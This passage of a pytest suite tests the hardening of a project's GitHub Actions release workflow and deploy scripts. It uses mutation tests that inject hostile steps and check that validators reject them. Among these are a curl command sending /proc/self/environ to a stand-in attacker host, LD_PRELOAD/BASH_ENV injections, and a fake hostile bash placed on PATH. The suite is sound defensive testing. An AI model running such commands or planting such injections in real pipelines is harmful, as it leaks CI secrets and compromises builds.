            "${{ steps.validate.outputs.security_runner_token_expires_at }}"
        ),
    }
    dispatch_contract = yaml.safe_dump(dispatch_input_job)
    assert r"pqsec-[0-9a-f]{32}" in dispatch_contract
    assert "protected_dispatch_is_canonical_repository_only" in dispatch_contract
    assert "protected_dispatch_requires_canonical_main" in dispatch_contract
    assert "release_manifest_runtime_sha" in security_job_text
    assert "git cat-file -e \"${runtime_sha}^{commit}\"" in security_job_text
    assert "propertyquarry_release_security_gate.py" in security_job_text
    assert "--flagship" in security_job_text
    assert "--severity-threshold HIGH" in security_job_text
    assert "if-no-files-found: error" in security_job_text
    assert "secrets." not in security_job_text
    assert type(release_job) is dict
    assert release_job["needs"] == RELEASE_JOB_NEEDS
    assert release_job["if"] == RELEASE_JOB_CONDITION


def test_v2_release_job_closed_yaml_contract_rejects_execution_indirection() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    start = workflow.index("  propertyquarry-release-v2:\n")
    end = workflow.index("  propertyquarry-activation-request-inert:\n", start)
    before, body, after = workflow[:start], workflow[start:end], workflow[end:]

    injected_command = body.replace(
        "        run: |\n",
        "        run: |\n"
        "          /usr/bin/curl --silent --data-binary @/proc/self/environ "
        "https://attacker.invalid/collect\n",
        1,
    )
    assert injected_command != body
    job_environment = body.replace(
        "    needs:\n",
        "    env:\n      LD_PRELOAD: /candidate/payload.so\n    needs:\n",
        1,
    )
    duplicate_key = body.replace(
        "    timeout-minutes: 360\n",
        "    timeout-minutes: 360\n    timeout-minutes: 1\n",
        1,
    )
    custom_tag = body.replace(
        "    timeout-minutes: 360\n",
        "    timeout-minutes: !candidate-controlled 360\n",
        1,
    )
    alias = body.replace(
        "    environment:\n",
        "    environment: &production-environment\n",
        1,
    ).replace(
        "    permissions:\n",
        "    copied-environment: *production-environment\n    permissions:\n",
        1,
    )
    extra_step = body + (
        "      - name: Candidate-controlled extra command\n"
        "        shell: /bin/bash {0}\n"
        "        run: /usr/bin/id\n\n"
    )
    missing_fd_handoff = body.replace(
        '          exec 9<"${oidc_fifo}"\n',
        "",
        1,
    )
    assert missing_fd_handoff != body
    missing_bearer_unset = body.replace(
        "          unset ACTIONS_ID_TOKEN_REQUEST_TOKEN\n",
        "",
        1,
    )
    wrong_fd_contract = body.replace(
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=8 \\\n",
        1,
    )
    wrong_fifo_mode = body.replace(
        '          /usr/bin/mkfifo -m 0600 -- "${oidc_fifo}"\n',
        '          /usr/bin/mkfifo -m 0666 -- "${oidc_fifo}"\n',
        1,
    )
    missing_private_receipt_capture = body.replace(
        '              client release-preflight >"${receipt}"\n',
        "              client release-preflight\n",
        1,
    )
    bypassed_install = body.replace(
        "              client ai-panorama-install >\"${receipt}\"\n",
        '              client release-run >"${receipt}"\n',
        1,
    )
    for mutant in (
        wrong_fifo_mode,
        missing_private_receipt_capture,
        bypassed_install,
    ):
        assert mutant != body
    bearer_in_env_argv = body.replace(
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n"
        '            ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \\\n',
        1,
    )
    hostile_startup_environment = []
    for name, safe_value, hostile_value in (
        ("BASH_ENV", "/dev/null", "/candidate/bash-env"),
        ("ENV", "/dev/null", "/candidate/env"),
        ("LD_PRELOAD", '""', "/candidate/preload.so"),
        ("LD_LIBRARY_PATH", '""', "/candidate/lib"),
        ("LD_AUDIT", '""', "/candidate/audit.so"),
        ("GCONV_PATH", '""', "/candidate/gconv"),
    ):
        mutant = body.replace(
            f"      {name}: {safe_value}\n",
            f"      {name}: {hostile_value}\n",
            1,
        )
        assert mutant != body
        hostile_startup_environment.append(mutant)

    for mutant_body in (
        injected_command,
        job_environment,
        duplicate_key,
        custom_tag,
        alias,
        extra_step,
        missing_fd_handoff,
        missing_bearer_unset,
        wrong_fd_contract,
        wrong_fifo_mode,
        missing_private_receipt_capture,
        bypassed_install,
        bearer_in_env_argv,
        *hostile_startup_environment,
    ):
        with pytest.raises((AssertionError, yaml.YAMLError)):
            _assert_exact_v2_release_job(before + mutant_body + after)

    competing_controller_job = workflow + (
        "\n  candidate-controller-sidecar:\n"
        "    runs-on: [self-hosted, propertyquarry-release-controller-v2]\n"
        "    permissions:\n"
        "      id-token: write\n"
        "    steps:\n"
        "      - run: /usr/bin/env\n"
    )
    with pytest.raises(AssertionError):
        _assert_exact_v2_release_job(competing_controller_job)

    expression_controller_job = workflow + (
        "\n  candidate-controller-expression:\n"
        "    runs-on: ${{ 'propertyquarry-release-controller-v2' }}\n"
        "    steps:\n"
        "      - run: /usr/bin/id\n"
    )
    with pytest.raises(AssertionError):
        _assert_exact_v2_release_job(expression_controller_job)


def test_smoke_runtime_routes_release_from_ordinary_ci_to_one_atomic_v2_lane() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    document = _strict_workflow_document(workflow)
    jobs = document["jobs"]
    aggregate_job = _workflow_job(workflow, "propertyquarry-ordinary-ci-success")
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")

    required_jobs = (
        "property-security-posture",
        "security-static",
        "propertyquarry-mirror-role-contract",
        "smoke-runtime-api",
        "propertyquarry-browser-contracts",
        "product-browser-e2e",
        "propertyquarry-postgres-browser-e2e",
        "propertyquarry-continuous-ux",
        "propertyquarry-accessibility-contracts",
        "propertyquarry-failure-state-contracts",
        "propertyquarry-activation-contracts",
        "smoke-runtime-postgres",
        "postgres-runtime-contracts",
    )
    assert type(jobs["propertyquarry-ordinary-ci-success"]) is dict
    assert jobs["propertyquarry-ordinary-ci-success"]["needs"] == list(required_jobs)
    assert jobs["propertyquarry-ordinary-ci-success"]["if"] == "${{ always() }}"
    for required_job in required_jobs:
        assert f"      - {required_job}\n" in aggregate_job
    assert "if: ${{ always() }}" in aggregate_job
    assert "details.get(\"result\") != \"success\"" in aggregate_job
    assert "secrets." not in aggregate_job
    assert jobs["propertyquarry-release-v2"]["needs"] == RELEASE_JOB_NEEDS
    for required_release_gate in RELEASE_JOB_NEEDS:
        assert f"      - {required_release_gate}\n" in release_job
        assert (
            f"needs['{required_release_gate}'].result == 'success'" in release_job
        )
    for legacy_job_name in (
        "propertyquarry-live-release-gates",
        "propertyquarry-live-activation-to-value",
        "propertyquarry-launch-controller-preflight",
        "propertyquarry-launch-gold",
    ):
        legacy_job = _workflow_job(workflow, legacy_job_name)
        assert "if: ${{ false }}" in legacy_job
        assert jobs[legacy_job_name]["if"] == "${{ false }}"
        assert legacy_job_name not in release_job
    assert "inputs.run_activation_journey != true" in release_job
    assert "activation_run_key" not in release_job
    assert "github.repository == 'ArchonMegalon/propertyquarry'" in release_job
    assert "inputs.run_activation_journey != true" in release_job
    assert "always()" in release_job
    assert "release-preflight" in release_job
    assert "release-run" in release_job
    assert "reconcile-run" not in release_job

    activation_inert = jobs["propertyquarry-activation-request-inert"]
    assert type(activation_inert) is dict
    assert activation_inert["if"] == (
        "${{ github.event_name == 'workflow_dispatch' "
        "&& inputs.run_activation_journey == true }}"
    )
    assert activation_inert["permissions"] == {"contents": "none"}
    assert "non-authoritative and inert" in yaml.safe_dump(activation_inert)

    requested_result = jobs["propertyquarry-requested-action-result"]
    assert type(requested_result) is dict
    assert requested_result["if"] == (
        "${{ always() && github.event_name == 'workflow_dispatch' "
        "&& (inputs.run_launch_authority == true "
        "|| inputs.run_activation_journey == true) }}"
    )
    assert requested_result["permissions"] == {"contents": "none"}
    assert requested_result["needs"] == [
        "propertyquarry-protected-dispatch-inputs",
        "propertyquarry-flagship-security",
        "propertyquarry-security-bootstrap-attestation",
        "propertyquarry-release-v2",
        "propertyquarry-activation-request-inert",
    ]
    requested_contract = yaml.safe_dump(requested_result)
    assert "protected_activation_requested_while_v2_activation_is_inert" in (
        requested_contract
    )
    assert "propertyquarry-release-v2" in requested_contract
    assert "result" in requested_contract


def test_core_ci_requires_the_genuine_chromium_cache_integration() -> None:
    workflow = _strict_workflow_document(
        _read(".github/workflows/smoke-runtime.yml")
    )
    job = workflow["jobs"]["smoke-runtime-api"]
    step = next(
        row
        for row in job["steps"]
        if row.get("name") == "Run core CI gates"
    )

    assert step == {
        "name": "Run core CI gates",
        "env": {
            "PROPERTYQUARRY_REQUIRE_REAL_CHROMIUM_INTEGRATION": "1",
        },
        "run": "make ci-gates",
    }
    assert (
        "PROPERTYQUARRY_REQUIRE_REAL_CHROMIUM_INTEGRATION=1 $(MAKE) test-api"
        in _read("Makefile")
    )


def test_smoke_runtime_v2_lane_is_fail_closed_without_installed_authority() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
    legacy_preflight = _workflow_job(
        workflow, "propertyquarry-launch-controller-preflight"
    )
    legacy_gold = _workflow_job(workflow, "propertyquarry-launch-gold")

    assert "run_launch_authority:" in workflow
    assert (
        "type: boolean"
        in workflow.split("run_launch_authority:", 1)[1].split("jobs:", 1)[0]
    )
    assert "inputs.run_launch_authority == true" in release_job
    assert "/usr/libexec/propertyquarry-release-control/" in release_job
    assert (
        "/usr/libexec/propertyquarry-release-control/"
        "propertyquarry-release-single-host-v2 \\\n"
        "              client release-preflight"
    ) in release_job
    assert (
        "/usr/libexec/propertyquarry-release-control/"
        "propertyquarry-release-single-host-v2 \\\n"
        "              client release-run"
    ) in release_job
    assert "propertyquarry-release-supervisor-v2" not in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_READY" not in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_SHA256" not in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH" not in release_job
    assert "--activate-snapshot" not in release_job
    assert "--restore-activation" not in release_job
    assert "scripts/propertyquarry_launch_authority.py" not in release_job
    assert "bash scripts/property_release_gates.sh" not in release_job
    assert "if: ${{ false }}" in legacy_preflight
    assert "if: ${{ false }}" in legacy_gold


def test_property_web_image_contains_the_canonical_release_manifest() -> None:
    dockerfile = _read("ea/Dockerfile.property-web")

    assert (
        "COPY docs/PROPERTYQUARRY_RELEASE_MANIFEST.md "
        "/app/docs/PROPERTYQUARRY_RELEASE_MANIFEST.md"
    ) in dockerfile


def test_protected_live_release_gate_is_remote_only_and_fail_closed() -> None:
    script = _read("scripts/propertyquarry_live_release_gates.sh")

    assert "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL" in script
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE" in script
    assert "PROPERTYQUARRY_LIVE_PRINCIPAL_ID" in script
    assert "PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN" in script
    assert "PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID" in script
    assert "EA_API_TOKEN" in script
    assert "--require-research-detail" in script
    assert "propertyquarry_live_mobile_surface_smoke.py" in script
    assert "propertyquarry_map_preview_flagship_gate.py" in script
    assert "propertyquarry_live_public_smoke.py" in script
    assert "propertyquarry_live_authenticated_smoke.py" in script
    assert "propertyquarry_live_telegram_delivery.py" in script
    assert "property-live-notification-delivery.json" in script
    assert "propertyquarry_live_release_provenance.py" in script
    assert script.index("propertyquarry_live_release_provenance.py") < script.index(
        "propertyquarry_live_mobile_surface_smoke.py"
    )
    assert "PROPERTYQUARRY_EXPECTED_RELEASE_COMMIT_SHA" in script
    assert "--no-canonical-fallback" in script
    assert "--seed-research-detail-fixture" not in script
    assert "--api-token" not in script
    assert "docker" not in script
    assert "compose" not in script
    assert "POSTGRES_PASSWORD" not in script
    assert "ensure_propertyquarry_render_bridge_runtime.py" not in script
    assert "--stage-only" in script
    assert "--activate-snapshot" not in script
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN" in script
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256" in script
    assert 'expected_phase="staged"' in script
    for required_option in (
        "--expected-repository",
        "--expected-public-origin",
        "--expected-branch",
        "--expected-commit-sha",
        "--expected-deployment-id",
        "--expected-artifact-set",
        "--expected-release-label",
        "--expected-release-generated-at",
        "--expected-image-digest",
        "--expected-replica-id",
        "--expected-web-image",
        "--expected-render-image",
        "--security-receipt",
        "--security-workflow-binding",
        "--expected-workflow-head-sha",
        "--expected-workflow-run-id",
        "--expected-workflow-run-attempt",
    ):
        assert required_option in script

    release_bundle = _read("scripts/property_release_gates.sh")
    assert release_bundle.startswith("#!/bin/bash -p\n")
    assert (
        'PYTHON_BIN="${PYTHON_BIN}" \\\n'
        "/usr/bin/env \\\n"
        "  -u BASH_ENV \\\n"
        "  -u ENV \\\n"
        "  /bin/bash --noprofile --norc -p "
        "scripts/propertyquarry_live_release_gates.sh"
    ) in release_bundle


def test_propertyquarry_deploy_missing_live_provenance_forces_targeted_e2e() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--require-controller-self-attestation" in script
    assert "--require-external-monotonic-cas" in script
    assert "git rev-parse" not in script


def test_propertyquarry_deploy_fails_closed_on_dirty_release_provenance() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert script.index("--controller-owns-all-privileged-actions") < script.index(
        "--contain-before-candidate-validation"
    )
    assert "git status" not in script


def test_propertyquarry_docker_context_excludes_ignored_secret_and_runtime_files() -> None:
    dockerignore = set(_read(".dockerignore").splitlines())

    assert {
        ".env",
        ".env.*",
        "**/.env",
        "**/.env.*",
        "*.pem",
        "**/*.pem",
        "*.key",
        "**/*.key",
        "*.ovpn",
        "**/*.ovpn",
        "attachments/",
        "daemon-gogcli-config/",
        "data-*/",
        "memorial_data/",
        "config/*.local.yml",
        "config/onemin_api_keys.local.json",
        "config/onemin_slot_owners.local.json",
        "*.py[cod]",
        "**/*.py[cod]",
    } <= dockerignore


def test_property_runtime_image_copies_reconstruction_playwright_dependency() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    runtime_copy = (
        "COPY scripts/propertyquarry_playwright_runtime.py "
        "/app/scripts/propertyquarry_playwright_runtime.py"
    )
    generator_copy = (
        "COPY scripts/generate_property_reconstruction.py "
        "/app/scripts/generate_property_reconstruction.py"
    )

    assert dockerfile.count(runtime_copy) == 1
    assert dockerfile.count(generator_copy) == 1
    assert dockerfile.index(runtime_copy) < dockerfile.index(generator_copy)
    assert dockerfile.index(generator_copy) < dockerfile.index(
        "COPY scripts/property_reconstruction_render_bridge.py "
        "/app/scripts/property_reconstruction_render_bridge.py"
    )
    assert "COPY ea/app /app/app" not in dockerfile


def test_propertyquarry_deploy_wrapper_preflights_prod_and_probes_runtime(
    tmp_path: Path,
) -> None:
    script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(script)
    assert 'operation="${operation%-run}-preflight"' in script
    assert "--read-only" in script
    assert "--forbid-containment" in script
    assert "--forbid-state-mutation" in script
    assert "--require-explicit-preflight-disposition" in script
    assert "propertyquarry-deploy-preflight-request.json" in script
    assert "propertyquarry-deploy-run-request.json" in script
    assert "A preflight request cannot" in script
    assert "must never be reused for a deploy run" in script
    assert "PROPERTYQUARRY_DEPLOY_PYTHON_BIN" not in script
    assert "docker compose" not in script

    marker = tmp_path / "hostile-startup-executed"
    hostile_bin = tmp_path / "hostile-bin"
    hostile_bin.mkdir()
    fake = hostile_bin / "bash"
    fake.write_text(
        f"#!/bin/sh\nprintf '%s\\n' hostile >> '{marker}'\nexit 97\n",
        encoding="utf-8",
    )
    fake.chmod(0o755)
    for name in ("dirname", "pwd", "env"):
        (hostile_bin / name).write_bytes(fake.read_bytes())
        (hostile_bin / name).chmod(0o755)
    bash_env = tmp_path / "BASH_ENV"
    bash_env.write_text(
        f"builtin printf '%s\\n' BASH_ENV >> '{marker}'\n",
        encoding="utf-8",
    )
    completed = subprocess.run(
        [str(ROOT / "scripts" / "deploy_propertyquarry.sh"), "--help"],
        cwd=ROOT,
        env={"PATH": str(hostile_bin), "BASH_ENV": str(bash_env), "ENV": str(bash_env)},
        check=False,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, completed.stderr
    assert "Usage:" in completed.stdout
    assert not marker.exists()

def test_propertyquarry_schema_migration_quiesces_existing_writers_before_commit(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="success",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode == 0, completed.stderr
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-completed",
        "candidate-api-ready",
        "candidate-worker-ready",
        "candidate-scheduler-ready",
    ]


def test_propertyquarry_schema_migration_failure_aborts_migrator_then_restores_prior_runtime(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="precommit-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
        "compose start api",
        "compose start worker",
    ]
    assert "restoring only API, worker, scheduler, and render containers that were running before quiesce" in completed.stderr


def test_propertyquarry_crash_reconciliation_contains_worker_and_migrator(
    tmp_path: Path,
) -> None:
    event_log = tmp_path / "crash-reconcile-events.log"
    shell = r'''
set -euo pipefail

declare -A SERVICE_STATE=(
  [ingress]="running"
  [api]="running"
  [worker]="running"
  [scheduler]="running"
  [render]="running"
  [migrate]="running"
)

fake_compose() {
  local action="$1"
  local skip_next=0
  local arg=""
  local service=""
  shift
  if [[ "${action}" == "ps" ]]; then
    for arg in "$@"; do service="${arg}"; done
    [[ "${SERVICE_STATE[${service}]:-missing}" == "missing" ]] || printf 'cid-%s' "${service}"
    return 0
  fi
  [[ "${action}" == "stop" ]] || return 2
  printf 'compose stop %s\n' "$*" >> "${EVENT_LOG}"
  for arg in "$@"; do
    if [[ "${skip_next}" == "1" ]]; then skip_next=0; continue; fi
    if [[ "${arg}" == "--timeout" ]]; then skip_next=1; continue; fi
    SERVICE_STATE["${arg}"]="stopped"
  done
}

container_state_line() {
  local service="${1#cid-}"
  if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
    printf 'running|healthy'
  else
    printf 'exited|none'
  fi
}

database_writer_inventory_lines() {
  local service=""
  for service in api worker scheduler migrate; do
    if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
      printf 'cid-%s|%s\n' "${service}" "${service}"
    fi
  done
}

database_writer_session_inventory_lines() { return 0; }
stop_database_writer_container() { return 0; }
database_writer_container_is_active() { return 1; }

DC=(fake_compose)
source "${QUIESCE_HELPER}"
PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler migrate)
propertyquarry_register_public_ingress_hold ingress ingress
propertyquarry_reconcile_incomplete_deploy_runtime \
  api api worker worker scheduler scheduler render render migrate migrate 30
propertyquarry_complete_crash_reconciliation
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
            "EVENT_LOG": str(event_log),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr
    assert event_log.read_text(encoding="utf-8").splitlines() == [
        "compose stop --timeout 30 ingress",
        "compose stop --timeout 30 api worker scheduler render migrate",
    ]


def test_propertyquarry_candidate_resolution_never_claims_live_default_containers(
    tmp_path: Path,
) -> None:
    event_log = tmp_path / "global-docker-events.log"
    shell = r'''
set -euo pipefail

candidate_compose() {
  if [[ "$1" == "ps" ]]; then
    return 0
  fi
  return 2
}

docker() {
  printf 'global-docker %s\n' "$*" >> "${EVENT_LOG}"
  case "$*" in
    *propertyquarry-api*) printf 'cid-live-default-api' ;;
    *propertyquarry-worker*) printf 'cid-live-default-worker' ;;
    *propertyquarry-scheduler*) printf 'cid-live-default-scheduler' ;;
  esac
}

container_state_line() {
  printf 'running|healthy'
}

DC=(candidate_compose)
source "${QUIESCE_HELPER}"
api_cid="$(container_id_for_service propertyquarry-api propertyquarry-api)"
worker_cid="$(container_id_for_service propertyquarry-worker propertyquarry-worker)"
scheduler_cid="$(container_id_for_service propertyquarry-scheduler propertyquarry-scheduler)"
[[ -z "${api_cid}" ]]
[[ -z "${worker_cid}" ]]
[[ -z "${scheduler_cid}" ]]
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
            "EVENT_LOG": str(event_log),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr
    assert not event_log.exists()


def test_propertyquarry_paused_writer_does_not_satisfy_quiesce_assertion(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="paused-writer-stuck",
        api_state="paused",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "compose start worker",
        "compose start scheduler",
    ]
    assert "api container cid-api is still active" in completed.stderr
    assert "recovery will not activate a prior non-running writer" in completed.stderr


def test_propertyquarry_paused_migrator_is_aborted_before_writer_restoration(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="paused-migrator-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
        "compose start api",
        "compose start worker",
    ]
    assert events.index("compose stop --timeout 30 migrate") < events.index("compose start api")


def test_propertyquarry_quiesce_treats_every_nonterminal_container_state_as_active() -> None:
    shell = r'''
set -euo pipefail

container_state_line() {
  printf '%s|none' "${1#cid-}"
}

DC=(false)
source "${QUIESCE_HELPER}"
for status in created running paused restarting removing unknown; do
  propertyquarry_schema_container_is_active "cid-${status}"
done
for status in exited dead; do
  if propertyquarry_schema_container_is_active "cid-${status}"; then
    exit 1
  fi
done
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr


def test_propertyquarry_partial_quiesce_failure_restores_the_complete_prior_runtime(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="quiesce-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "compose start api",
        "compose start worker",
        "compose start scheduler",
    ]
    assert "Could not stop every pre-migration PropertyQuarry schema writer" in completed.stderr


def test_propertyquarry_postcommit_failure_holds_candidate_writers_stopped(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="postcommit-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-completed",
        "candidate-api-started",
        "compose stop --timeout 30 api worker scheduler render",
    ]
    assert not any(event.startswith("compose start ") for event in events)
    assert "Do not restart the previous image" in completed.stderr


def test_propertyquarry_first_deploy_migration_failure_has_no_runtime_to_restore(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="precommit-failure",
        api_state="stopped",
        worker_state="stopped",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
    ]
    assert "no prior API, worker, scheduler, or render containers to restore" in completed.stderr


def test_propertyquarry_deploy_wires_quiesce_around_governed_migration() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--require-server-derived-database-identity" in script
    assert "--require-signed-disposable-or-allowed-database-target" in script
    assert "--database-fence-policy" in script
    assert "propertyquarry_deploy_quiesce.sh" not in script


def test_propertyquarry_deploy_wrapper_supports_focused_provider_country_matrix() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--signed-request-fd" in script
    assert "PROPERTYQUARRY_DEPLOY_PROVIDER_COUNTRIES" not in script


def test_propertyquarry_deploy_catalog_probe_is_read_only() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--read-only" in script
    assert "--forbid-state-mutation" in script
    assert "--require-explicit-preflight-disposition" in script


def test_propertyquarry_deploy_wrapper_requires_presentation_e2e_for_tour_media_changes() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--candidate-root-fd" in script
    assert "--forbid-candidate-output-authority" in script


def test_propertyquarry_deploy_wrapper_resolves_live_smoke_identity_from_env_file() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "EA_RUNTIME_MODE" in script
    assert "PROPERTYQUARRY_DEPLOY_SIGNED_REQUEST" in script
    assert "EA_API_TOKEN" not in script


def test_propertyquarry_deploy_mobile_smoke_covers_customer_app_surfaces() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "/app/" not in script


def test_propertyquarry_deploy_wrapper_stays_property_only() -> None:
    script = _read("scripts/deploy_propertyquarry.sh").lower()

    for forbidden in (
        "ea-openvoice",
        "openvoice",
        "ea-responses-proxy",
        "ea-teable-relay",
        "/docker/chummercomplete",
        "chummer-playwright",
        "/mnt/onedrive",
        "/mnt/pcloud",
    ):
        assert forbidden not in script


def test_propertyquarry_compose_mounts_operator_tour_export_drop() -> None:
    compose = _read("docker-compose.property.yml")

    assert "PROPERTYQUARRY_TOUR_EXPORT_DROP_DIR: /data/incoming_property_tours" in compose
    assert "PROPERTYQUARRY_TOUR_EXPORT_INCOMING_DIR: /data/incoming_property_tours" in compose
    assert "./state/incoming_property_tours:/data/incoming_property_tours" in compose


def test_propertyquarry_runtime_images_use_image_baked_app_code_not_repo_bind_mounts() -> None:
    compose = _read("docker-compose.property.yml")

    assert "./config:/app/config:ro" in compose
    assert "./ea:/app" not in compose
    assert "./scripts:/app/scripts" not in compose
    assert ".:/app" not in compose


def test_propertyquarry_render_runtime_keeps_playwright_only_for_reconstruction() -> None:
    dockerfile = _read("ea/Dockerfile.property")

    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" in dockerfile
    assert "python -m playwright install chromium" in dockerfile
    assert "playwright install --with-deps" not in dockerfile
    for excluded_provider_runtime in (
        "render_magicfit_property_flythrough.py",
        "render_omagic_property_model_walkthrough.py",
        "render_magicai_model_upload_adapter.py",
        "render_onemin_property_i2v_segment.py",
        "mootion_movie_worker.py",
    ):
        assert excluded_provider_runtime not in dockerfile


def test_property_tour_export_scripts_share_container_incoming_path() -> None:
    discovery = _read("scripts/discover_property_tour_exports.py")
    manifest = _read("scripts/materialize_property_tour_export_manifest.py")

    assert 'or "/data/incoming_property_tours"' in discovery
    assert 'Path("/data/incoming_property_tours")' in manifest
    assert '"state" / "incoming_property_tours"' in manifest
    assert "/data/property_tour_export_drop" not in discovery


def test_property_release_gate_runs_payfunnels_billing_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "PayFunnels checkout, webhook, refund, mismatch, and billing-surface contracts" in release_gate
    assert "tests/test_product_api_contracts.py -k 'payfunnels'" in release_gate


def test_property_release_gate_runs_heyy_whatsapp_contracts() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "Heyy WhatsApp adapter, opt-in, STOP/START, webhook, and receipt contracts" in release_gate
    assert "tests/test_property_heyy_adapter_contracts.py" in release_gate
    assert "tests/test_property_heyy_api_contracts.py" in release_gate


def test_property_release_gate_runs_id_austria_readiness_contract() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "ID Austria OIDC readiness receipt and Austrian-IP sign-in gating" in release_gate
    assert "scripts/verify_id_austria_provider.py" in release_gate


def test_property_release_gate_runs_offline_ranking_benchmark() -> None:
    release_gate = _read("scripts/property_release_gates.sh")

    assert "offline ranking benchmark for hard filters, soft scoring, ordering, and scout thresholds" in release_gate
    assert "scripts/check_property_ranking_benchmark.py" in release_gate


def test_propertyquarry_release_and_deploy_fail_closed_on_release_bound_dr_evidence() -> None:
    release_gate = _read("scripts/property_release_gates.sh")
    deploy = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(deploy)
    for required in (
        "PROPERTYQUARRY_DR_BACKUP_RECEIPT",
        "PROPERTYQUARRY_DR_RESTORE_RECEIPT",
        "PROPERTYQUARRY_RELEASE_COMMIT_SHA",
        "PROPERTYQUARRY_RELEASE_IMAGE_DIGEST",
        "PROPERTYQUARRY_DR_RELEASE_MAX_AGE_SECONDS",
        "scripts/propertyquarry_postgres_dr.py release-gate",
        "_completion/disaster_recovery/release-gate.json",
    ):
        assert required in release_gate
    assert "tests/test_propertyquarry_postgres_dr.py" in release_gate
    assert release_gate.index(
        "scripts/propertyquarry_postgres_dr.py release-gate"
    ) < release_gate.index(
        "/bin/bash --noprofile --norc -p scripts/propertyquarry_live_release_gates.sh"
    )
    assert "--controller-owns-all-privileged-actions" in deploy
    assert "--database-fence-policy" in deploy
    assert "--require-server-derived-database-identity" in deploy
